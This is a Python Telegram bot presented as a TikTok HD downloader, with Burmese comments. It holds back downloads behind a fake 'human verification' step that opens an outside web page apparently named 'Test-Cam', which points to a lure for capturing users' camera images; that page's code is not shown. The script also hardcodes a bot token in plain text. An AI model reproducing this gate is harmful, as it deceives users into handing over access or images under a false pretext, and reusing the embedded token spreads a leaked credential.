import telebot
import requests
from telebot import types

# --- API CONFIG ---
BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"
WEB_APP_URL = "https://tar-alt.github.io/Test-Cam/" 

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🌟 *Ultra HD TikTok Downloader*\n\nTikTok Link ပို့ပေးပါ။", parse_mode="Markdown")

@bot.message_handler(func=lambda message: "tiktok.com" in message.text)
def handle_tiktok(message):
    user_id = message.chat.id
    user_link = message.text
    
    # GitHub မှာ run ရင် variable က ပျောက်သွားတတ်လို့ Button ထဲမှာ link ကို တပါတည်း ထည့်ထားမယ်
    markup = types.InlineKeyboardMarkup()
    # WebApp URL နောက်မှာ link ကို parameter အနေနဲ့ တွဲပေးလိုက်တာက ပိုစိတ်ချရပါတယ်
    web_app = types.WebAppInfo(url=WEB_APP_URL)
    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔓", web_app=web_app)
    markup.add(verify_btn)
    
    bot.reply_to(message, f"⚠️ *Verification Required*\n\nလူဟုတ်မဟုတ် အရင်စစ်ဆေးပေးပါ။\n\nLink: `{user_link}`", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "✅ Verification_Success")
def process_download(message):
    user_id = message.chat.id
    
    # ၁။ Success စာကြောင်းကို ချက်ချင်းဖျက်မယ်
    try:
        bot.delete_message(user_id, message.message_id)
    except:
        pass

    # ၂။ Reply ပြန်ထားတဲ့ message ကနေ link ကို ပြန်ရှာမယ် (GitHub အတွက် ပိုစိတ်ချရတဲ့ နည်းလမ်း)
    if message.reply_to_message and "Link: " in message.reply_to_message.text:
        video_link = message.reply_to_message.text.split("Link: ")[1].strip()
        
        status_msg = bot.send_message(user_id, "🚀 Verification အောင်မြင်ပါသည်။ ဗီဒီယို ပို့ပေးနေပါပြီ...")
        
        try:
            api_url = f"https://www.tikwm.com/api/?url={video_link}&hd=1"
            res = requests.get(api_url).json()
            
            if res.get('code') == 0:
                video_url = res['data'].get('hdplay') or res['data'].get('play')
                bot.send_video(
                    user_id, 
                    video_url, 
                    caption="✅ *Download Successful!*\n\nCreated by: [Taro](https://t.me/Yes_is_me_Taro)",
                    parse_mode="Markdown"
                )
                bot.delete_message(user_id, status_msg.message_id)
            else:
                bot.edit_message_text(f"❌ Error: ဗီဒီယို ရှာမတွေ့ပါ။", user_id, status_msg.message_id)
        except:
            bot.edit_message_text("⚠️ API error ဖြစ်သွားပါတယ်။ ခဏနေမှ ပြန်စမ်းပါ။", user_id, status_msg.message_id)
    else:
        bot.send_message(user_id, "⚠️ Verification မလုပ်ခင် TikTok Link ကို အရင်ပို့ပေးပါ။")

bot.infinity_polling()
